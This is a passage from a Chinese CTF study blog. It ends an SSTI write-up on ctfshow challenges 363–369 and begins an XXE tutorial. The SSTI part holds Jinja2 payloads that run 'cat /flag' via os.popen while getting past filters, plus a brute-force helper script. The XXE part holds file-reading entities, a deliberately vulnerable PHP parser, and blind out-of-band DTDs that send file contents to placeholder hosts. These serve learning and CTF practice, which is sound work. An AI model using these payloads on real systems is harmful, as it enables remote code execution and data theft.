/flag&#x27;).read()&quot;))%&#125;</span><br></code></pre></td></tr></table></figure><p>这种还是可以直接写出来的</p><p>另外一种解法就是通过全角数字的解法得到答案</p><h3 id="3ctfshow-363"><a class="markdownIt-Anchor" href="#3ctfshow-363"></a> 3.ctfshow 363</h3><p>这题在此基础上<strong>过滤了引号</strong>，由此并不能直接用上面的方法，我尝试调用os.__class__.close并且用全角符号进行绕过,并且运用request.args.来间接调用发现好像并不能执行，因此，借鉴一下得到了一种解法</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;url<span class="hljs-emphasis">_for.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">request.args.a</span>][<span class="hljs-symbol">request.args.b</span>](request.args.c).read()&#125;&#125;&amp;a=os&amp;b=popen&amp;c=cat /flag</span><br></code></pre></td></tr></table></figure><p>request.args用于获取 URL 中的查询参数如果有就返回如果没有将引发异常，这里后面的输入就可以得到答案了。</p><p>config.__str__[2]就是o可以拼接os,但是字母不够，仅仅是一种思路</p><p>此外还有一种利用chr的方式,也是可以的</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;% set chr=url<span class="hljs-emphasis">_for.<span class="hljs-strong">__globals__</span>.<span class="hljs-strong">__builtins__</span>.chr %&#125;&#123;% print url_</span>for.<span class="hljs-strong">__globals__</span>[chr(111)%2bchr(115)]%&#125;<br></code></pre></td></tr></table></figure><h3 id="4ctfshow-364"><a class="markdownIt-Anchor" href="#4ctfshow-364"></a> 4.ctfshow 364</h3><p>这题<strong>过滤了args</strong>,这题可以用request.values来传参，相比之下values支持get和post，优先级的话是先get,使用方法基本一样</p><p>上payload</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;url<span class="hljs-emphasis">_for.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">request.values.a</span>][<span class="hljs-symbol">request.values.b</span>](request.values.c).read()&#125;&#125;&amp;a=os&amp;b=popen&amp;c=cat /flag</span><br></code></pre></td></tr></table></figure><p>当然这题发现好像也可以传cookies来进行</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/ssti/364.png" alt="364"></p><p>当然了也可以用lipsum来，lipsum里面有内置的os模块</p><p>payload是</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;lipsum.<span class="hljs-strong">__globals__</span>.os.popen(request.values.aaa).read()&#125;&#125;&amp;aaa=cat /flag<br></code></pre></td></tr></table></figure><h3 id="5ctfshow-365"><a class="markdownIt-Anchor" href="#5ctfshow-365"></a> 5.ctfshow 365</h3><p>这题用上面的lipsum的payload可以直接出答案</p><p>看了一下网上的wp这题是<strong>过滤[]</strong>，在上面的内容讲到过__getitem__，在遇到了‘和[]被禁用的时候可以使用这个函数</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;config.<span class="hljs-strong">__str__</span>().<span class="hljs-strong">__getitem__</span>(22)&#125;&#125;<br></code></pre></td></tr></table></figure><p>在这一题里面22是c，可以尝试构造cat /flag，用~来拼接起来</p><h3 id="6ctfshow-366"><a class="markdownIt-Anchor" href="#6ctfshow-366"></a> 6.ctfshow 366</h3><p>这题在前面题目的基础上<strong>过滤了下划线</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;lipsum|attr(request.values.a)|attr(request.values.b)(request.values.c)|attr(request.values.d)(request.values.ocean)|attr(request.values.f)()&#125;&#125;&amp;ocean=cat /flag&amp;a=<span class="hljs-strong">__globals__</span>&amp;b=<span class="hljs-strong">__getitem__</span>&amp;c=os&amp;d=popen&amp;f=read<br></code></pre></td></tr></table></figure><p>这里我自己有一个疑惑点，觉得getitem不是必要的，但是输入后又不正确，通过gpt询问后，给的大致原因是</p><p>第二个URL之所以能够执行，是因为它使用了 <code>__getitem__</code> 这种更灵活的方式来访问全局变量，从而成功获取到 <code>os</code> 模块，并最终执行了命令。而第一个URL中直接使用 <code>attr</code> 的方式可能会因为解析问题而失败。我的理解是并不能直接有效的访问到os这个模块</p><p>由于只是检测name里面的传参，其实也可以精简一点用cookie来传参</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/ssti/366.png" alt="366"></p><p>PS(我认为这里换values，进行post传参也是一种方法，但是方法不成立orz)</p><h3 id="7ctfshow-367"><a class="markdownIt-Anchor" href="#7ctfshow-367"></a> 7.ctfshow 367</h3><p>这题<strong>过滤os</strong></p><p>直接用上面的payload直接可以过，看wp有一种是用get的方法</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125;&#125;&amp;a=<span class="hljs-strong">__globals__</span>&amp;b=os&amp;c=cat /flag<br></code></pre></td></tr></table></figure><p>366的payload使用多个 <code>attr</code> 需要模板引擎逐步解析并执行每个步骤，在某些情况下可能出现解析和执行顺序问题，导致无法正确执行 <code>read</code>。</p><p>这一题的payload链式调用方式更简单，直接执行一系列方法调用，容易通过模板引擎解析并执行</p><p>至于我想的问题？上面的为什么后面不能直接调用read()</p><p>每一步 <code>attr</code> 调用之间是独立的，模板引擎会分别解析和执行每个 <code>attr</code>，这样导致在调用 <code>os.popen(&quot;cat /flag&quot;)</code> 后，结果没有直接传递给 <code>attr(request.values.f)()</code>。因此，模板引擎可能在 <code>attr</code> 调用之间无法正确链接上下文，导致 <code>read</code> 无法直接执行。</p><p>这是两者payload的区别，也是记录一下方便回顾。</p><h3 id="8ctfshow-368"><a class="markdownIt-Anchor" href="#8ctfshow-368"></a> 8.ctfshow 368</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">测试了一下，这题禁用前双花括号,可以利用&#123;%...%&#125;，利用&#123;%print %&#125;打印出来<br></code></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;%print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()%&#125;&amp;a=<span class="hljs-strong">__globals__</span>&amp;b=os&amp;c=cat /flag<br></code></pre></td></tr></table></figure><h3 id="9ctfshow-369"><a class="markdownIt-Anchor" href="#9ctfshow-369"></a> 9.ctfshow 369</h3><p>这题<strong>禁用了request</strong>，就比较麻烦了</p><p>由于下划线被禁用了，不能使用getitem,看了师傅的wp,可以参照365部分的知识点，利用config里面string就行拼接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;f44b83e7-b564-400c-a10a-7dfd8acc96d3.challenge.ctf.show/?name=&#123;&#123;% print (config|string|list).pop(&#123;&#125;).lower() %&#125;&#125;&quot;</span><br>payload = <span class="hljs-string">&quot;cat /flag&quot;</span><br>result = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment"># 遍历 payload 中的每个字符</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> payload:<br>    <span class="hljs-comment"># 尝试从 0 到 999 的整数值</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">1000</span>):<br>        <span class="hljs-comment"># 向目标 URL 发送请求，替换占位符</span><br>        r = requests.get(url=url.<span class="hljs-built_in">format</span>(i))<br>        <span class="hljs-comment"># 查找响应中的 &lt;h3&gt; 标签位置</span><br>        location = r.text.find(<span class="hljs-string">&quot;&lt;h3&gt;&quot;</span>)<br>        <span class="hljs-comment"># 获取 &lt;h3&gt; 标签后的字符</span><br>        word = r.text[location+<span class="hljs-number">4</span>:location+<span class="hljs-number">5</span>]<br>        <span class="hljs-comment"># 如果字符匹配，记录并跳出循环</span><br>        <span class="hljs-keyword">if</span> word == j.lower():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;(config|string|list).pop(%d).lower() == %s&quot;</span> % (i, j))<br>            result += <span class="hljs-string">&quot;(config|string|list).pop(%d).lower()~&quot;</span> % (i)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-comment"># 打印最终结果，去掉末尾的 ~</span><br><span class="hljs-built_in">print</span>(result[:-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><p>简要的payload就是</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;%print (lipsum|attr(a)).get(b).popen(c).read()%&#125;<br></code></pre></td></tr></table></figure><p>其中的abc，分别是<code>__globals__</code>,os,cat /flag,带入构成payload</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/ssti/369.png" alt="369"></p><p>还有一种替换字符的没怎么看懂就不写了</p><p>后面的三题没怎么看懂wp，orz,大题就是利用dict构造得到数字，然后利用得到最后拼接的意思，这次就先写到这里了。</p><h2 id="五-刷题有感"><a class="markdownIt-Anchor" href="#五-刷题有感"></a> 五、刷题有感</h2><p>这里放一下刷题遇到的姿势</p><h3 id="unicode绕过"><a class="markdownIt-Anchor" href="#unicode绕过"></a> unicode绕过</h3><p>适用于禁用了一些常规的还把.给禁用的，配合attr|有奇效</p><p>例题:<a href="https://www.nssctf.cn/problem/910">安洵杯 2020Normal SSTI</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssti</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xxe漏洞学习</title>
    <link href="/2024/06/10/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/06/10/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>前言:深入浅出的学习一下xxe漏洞</p><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/3357?time__1311=n4%2BxnD0DgGYQwqYq40HpDUoL7rAT2rD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F">一篇文章带你深入理解漏洞之 XXE 漏洞</a></p><p><a href="https://blog.csdn.net/qq_61553520/article/details/130565993">XXE漏洞详解(全网最详细)</a></p><p><a href="https://blog.csdn.net/jayq1/article/details/139299924">【CTF-Web】XXE学习笔记</a></p><h2 id="一-xxe-是什么"><a class="markdownIt-Anchor" href="#一-xxe-是什么"></a> <strong>一、XXE 是什么</strong></h2><p>在了解xxe之前，需要了解一下xml注入，通常都是逻辑漏洞，如下内容</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/xml.png" alt="xml"></p><p>能插入xml代码，肯定还想要更多骚操作，于是就出现了xxe</p><p>XXE(XML External Entity Injection) 全称为 XML 外部实体注入，是一个注入漏洞。注意的是<strong>外部实体</strong>，不要被其他名字相似的东西扰乱了思维。</p><h2 id="二-基础知识"><a class="markdownIt-Anchor" href="#二-基础知识"></a> 二、基础知识</h2><h3 id="xxe漏洞原理"><a class="markdownIt-Anchor" href="#xxe漏洞原理"></a> XXE漏洞原理</h3><p>漏洞成因：解析时未对XML外部实体加以限制，导致攻击者将恶意代码注入到XML中，导致服务器加载恶意的外部实体引发文件读取，SSRF，命令执行等危害操作。</p><p>特征：HTTP的Request报文出现以下请求报文，说明采用的是xml数据传输，可以进行xml测试漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Content-<span class="hljs-built_in">type</span>:text/xml application/xml<br></code></pre></td></tr></table></figure><h3 id="xml的基础知识"><a class="markdownIt-Anchor" href="#xml的基础知识"></a> XML的基础知识</h3><h4 id="语法"><a class="markdownIt-Anchor" href="#语法"></a> 语法：</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">XML 指可扩展标记语言（EXtensible Markup Language）<br>XML 是一种标记语言，很类似 HTML<br>XML 被设计为传输和存储数据，其焦点是数据的内容<br>XML 被设计用来结构化、存储以及传输信息<br>XML 允许创作者定义自己的标签和自己的文档结构<br></code></pre></td></tr></table></figure><h4 id="结构"><a class="markdownIt-Anchor" href="#结构"></a> 结构:</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">1.XML 文档声明，在文档的第一行<br>2.XML 文档类型定义，即DTD，XXE 漏洞所在的地方<br>3.XML 文档元素<br></code></pre></td></tr></table></figure><h4 id="格式规范dtd"><a class="markdownIt-Anchor" href="#格式规范dtd"></a> 格式规范DTD:</h4><p>XML 文档有自己的格式规范，这个格式规范是 DTD（document type definition） 来控制的，如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;//这一行是 XML 文档定义<br>&lt;!DOCTYPE message [<br>&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;<br>&lt;!ELEMENT receiver (#PCDATA)&gt;<br>&lt;!ELEMENT sender (#PCDATA)&gt;<br>&lt;!ELEMENT header (#PCDATA)&gt;<br>&lt;!ELEMENT msg (#PCDATA)&gt;<br></code></pre></td></tr></table></figure><p>上面这个 DTD 就定义了 XML 的根元素是 message，然后跟元素下面有一些子元素，那么 XML 到时候必须像下面这么写</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">receiver</span>&gt;</span></span>Myself<span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">receiver</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">sender</span>&gt;</span></span>Someone<span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">sender</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span></span>TheReminder<span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">msg</span>&gt;</span></span>This is an amazing book<span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">msg</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>除了定义元素，还可以定义实体，分为内部实体和外部实体</p><h5 id="内部实体"><a class="markdownIt-Anchor" href="#内部实体"></a> 内部实体</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>&lt;!DOCTYPE foo [<br>&lt;!ELEMENT foo ANY &gt;<br>&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;<br></code></pre></td></tr></table></figure><p>这里定义元素是ANY，说明接受任何元素，但是又定义了一个实体(也可以把他看成一个变量)，那么就可以写作这样</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span><br></code></pre></td></tr></table></figure><p>我们使用了&amp;xxe对上面定义的xxe实体进行了引用，到时候输出的时候&amp;xxe就会被test替代。</p><h5 id="外部实体重点"><a class="markdownIt-Anchor" href="#外部实体重点"></a> 外部实体(重点)</h5><p>有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机，<br>外部实体的引用可以利用如下协议<br>file:///path/to/file.ext<br><a href="http://url/file.ext">http://url/file.ext</a><br>php://filter/read=convert.base64-encode/resource=conf.php</p><p>比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;<br>&lt;!DOCTYPE foo [<br>&lt;!ELEMENT foo ANY &gt;<br>&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;<br>&lt;creds&gt;<br>    &lt;user&gt;&amp;xxe;&lt;/user&gt;<br>    &lt;pass&gt;mypass&lt;/pass&gt;<br>&lt;/creds&gt;<br></code></pre></td></tr></table></figure><p>这样对引用资源所做的任何更改都会在文档中自动更新</p><p>还有一种引用方式是使用 引用公用 DTD的方法,如下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>&lt;!DOCTYPE foo [<br>&lt;!ELEMENT foo ANY &gt;<br>&lt;!ENTITY  % xxe SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot; &gt;<br>%xxe;<br>]&gt;<br>&lt;foo&gt;&amp;evil;&lt;/foo&gt;<br> <br>外部evil.dtd中的内容<br>&lt;!ENTITY evil SYSTEM “file:///d:/1.txt” &gt;<br></code></pre></td></tr></table></figure><p>%xxe执行后会加载外部实体 evil.dtd 并执行，得到的结果会放在&lt;foo&gt;&lt;/foo&gt;中。</p><hr><p>我们在上面将实体分为了内部和外部，但是实际情况上，也可以分为通用实体和参数实体（orz</p><h5 id="通用实体"><a class="markdownIt-Anchor" href="#通用实体"></a> 通用实体</h5><p>用 &amp;实体名; 引用的实体，他在DTD 中定义，在 XML 文档中引用，例如</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span> <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">updateProfile</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///c:/windows/win.ini&quot;</span>&gt;</span></span><br><span class="hljs-meta"> ]&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">updateProfile</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">firstname</span>&gt;</span>Joe<span class="hljs-tag">&lt;/<span class="hljs-name">firstname</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">lastname</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">lastname</span>&gt;</span>  <br>    ... <br><span class="hljs-tag">&lt;/<span class="hljs-name">updateProfile</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="参数实体"><a class="markdownIt-Anchor" href="#参数实体"></a> 参数实体</h5><p>(1)使用 <code>% 实体名</code>(<strong>这里面空格不能少</strong>) 在 DTD 中定义，并且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong><br>(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体<br>(3)和通用实体一样，参数实体也可以外部引用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">an-element</span> <span class="hljs-string">&quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;</span>&gt;</span> <br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote-dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://somewhere.example.org/remote.dtd&quot;</span>&gt;</span> <br>%an-element; %remote-dtd;<br></code></pre></td></tr></table></figure><p>参数实体在我们 Blind XXE 中起到了至关重要的作用</p><h2 id="三-xxe漏洞利用"><a class="markdownIt-Anchor" href="#三-xxe漏洞利用"></a> 三、XXE漏洞利用</h2><p>通过对基础知识的理解，我们不难发现可以通过读dtd,将路径换成敏感路径，把敏感路径读取出来</p><h3 id="有回显读取本地文件"><a class="markdownIt-Anchor" href="#有回显读取本地文件"></a> 有回显读取本地文件</h3><p>由于本人php版本高于7.1需要将代码进行适当的调整，如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 输出所有错误信息</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">1</span>);<br><br><span class="hljs-comment">// 临时允许外部实体加载（仅用于测试）</span><br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><br><span class="hljs-comment">// 获取XML字符串</span><br><span class="hljs-variable">$xmlString</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xml&#x27;</span>];<br><br><span class="hljs-comment">// 解析XML字符串</span><br><span class="hljs-variable">$xml</span> = <span class="hljs-title function_ invoke__">simplexml_load_string</span>(<span class="hljs-variable">$xmlString</span>, <span class="hljs-literal">null</span>, LIBXML_NOENT);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$xml</span> === <span class="hljs-literal">false</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Failed to load XML. Errors: &quot;</span>;<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-title function_ invoke__">libxml_get_errors</span>() <span class="hljs-keyword">as</span> <span class="hljs-variable">$error</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>, <span class="hljs-variable">$error</span>-&gt;message;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Parsed XML: &quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">htmlspecialchars</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$xml</span>); <span class="hljs-comment">// 使用htmlspecialchars防止XSS</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>payload进行url编码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///D://1.txt&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/%E6%9C%AC%E5%9C%B0%E5%9B%9E%E6%98%BE.png" alt="本地回显"></p><p>由此还可以继续延申，在这种情况下由于没有什么特殊符号，可以顺利读取，那假如有呢</p><p>比如<img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/1.txt.png" alt="1.txt"></p><p>我们再继续尝试看看网页，此时会有一堆报错</p><p>这个时候可以使用<strong>CDATA</strong></p><p>介绍：CDATA节中所有的字符都会被当做元素字符数据的常量部分，而不是xml标记</p><p>因此可以尝试把读出来的数据放在CDATA中输出进行绕过,这里会用到参数实体，payload就不展示了，感兴趣可以自己尝试。</p><h3 id="无回显读取本地文件"><a class="markdownIt-Anchor" href="#无回显读取本地文件"></a> 无回显读取本地文件</h3><h4 id="加载远程dtd"><a class="markdownIt-Anchor" href="#加载远程dtd"></a> 加载远程DTD</h4><p>在远程服务器上新建test.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://xxx.xxx.xxx.xxx/?content=%file;&#x27;&gt;&quot;&gt; %payload;<br>//%号要进行实体编码成&amp;#x25<br></code></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE test[<br>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=D:/1.txt&quot;&gt;<br>&lt;!ENTITY % dtd SYSTEM &quot;http://xxx.xxx.xxx.xxx/test.dtd&quot;&gt;<br>%dtd;<br>%send;<br>]&gt;<br></code></pre></td></tr></table></figure><p>讲一下流程：首先先执行%dtd请求远程服务器上的test.dtd,然后执行%payload发送执行%file，最后执行%file获取对方服务器上的敏感文件，替换%send，实现外带</p><p>套用模板</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; <br>&lt;!DOCTYPE data [<br>&lt;!ENTITY % file SYSTEM &quot;file:///c://test/1.txt&quot;&gt;<br>&lt;!ENTITY % dtd SYSTEM &quot;http://localhost:88/evil.xml&quot;&gt; <br>%dtd; %all; <br>]&gt; <br>&lt;value&gt;&amp;send;&lt;/value&gt;<br> <br>evil.xml文件内容为<br>&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://localhost:88%file;&#x27;&gt;&quot;&gt;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; 